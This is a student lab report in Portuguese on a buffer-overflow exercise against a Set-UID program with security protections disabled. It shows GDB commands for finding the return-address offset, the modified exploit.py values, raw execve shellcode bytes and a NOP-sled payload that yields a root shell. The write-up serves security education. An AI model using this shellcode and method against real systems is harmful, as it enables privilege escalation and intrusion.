# Trabalho realizado na semana 5

## Task 1

Antes de começarmos a primeira tarefa, temos de desligar algumas das proteções do sistema operativo,  a randomização do espaço de endereços e a proibição ao nível da shell de ser executada por processos com Set-UID.
Executamos um programa (callshellcode.c), que cria dois binários (a32.out(32-bit) e a64.out(64-bit)), este programa é invocado através da stack porque senão o programa falharia. Quando corremos ambos os binários é aberta uma shell.

## Task 2

É nos dado o código de um programa com uma vulnerabilidade buffer-overflow. Este programa tenta copiar para um buffer de tamanho máximo de 100 bytes, um array de carateres que pode ter até 517 bytes. Como o strcpy não verifica os limites do buffer, ocorre overflow.
Depois de compilarmos o programa e desativarmos as proteções de segurança, mudamos o owner para root e ativamos o Set-UID.

## Task 3

Para aproveitar ao máximo o exploit de buffer-overflow, primeiramente é necessário criar o ficheiro vazio badfile e executar o código em modo debug para assim ser possível determinar a distância entre a posição de inicio do buffer e o endereço de retorno. Isto é feito através dos seguintes dois comandos:

```
$ touch badfile
$ gdb stack-L1-dbg
```

Dentro do GDB, nós definimos um ponto de interrupção na função “bof” e executamos o programa:

```
gdb-peda$ b bof
gdb-peda$ run
```

De seguida, utilizamos os seguintes comandos GDB para obter o valor do “ebp” e o endereço do buffer:

```
gdb-peda$ p $ebp
gdb-peda$ p &buffer
gdb-peda$ quit
```

O ficheiro exploit.py não está completo e foi necessário o modificarmos para funcionar corretamente. 

A shellcode foi modificada para:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80

A variável start foi modificada para o valor 517-len(shellcode).

A variável ret foi modificada para o valor 0xffffca98 + start.

A variável offset foi modificada para o valor 0xffffca98 - 0xffffca2c + 4.

A variável L manteve-se a 4.

Depois de o ficheiro exploit.py ser modificado, ele é executado para gerar o conteúdo do badfile através do seguinte comando:

```
$ ./exploit.py
```

Executou-se o programa vulnerável que provocou o buffer overflow e obtivemos permissões de root.

## Task 4

Como na tarefa anterior, é necessário começar por tornar o programa vulnerável usando o GDB, definindo um ponto de interrupção e executando o programa da seguinte forma:

```
$ gdb stack-L2
(gdb) b bof
(gdb) run
```

Uma vez que não se tem conhecimento do tamanho do buffer é necessário criar um payload que funcione para qualquer tamanho dentro da faixa de 100 a 200 bytes.
Cria-se então um payload no ficheiro exploit.py que inclua “NOP sleds” seguidos pelo shellcode:
shellcode = b"\x90" * 100  
shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  
payload = shellcode
Depois de se criar o payload, já podemos executar o ataque da seguinte maneira:

```
$ ./exploit.py  
$ ./stack-L2
```
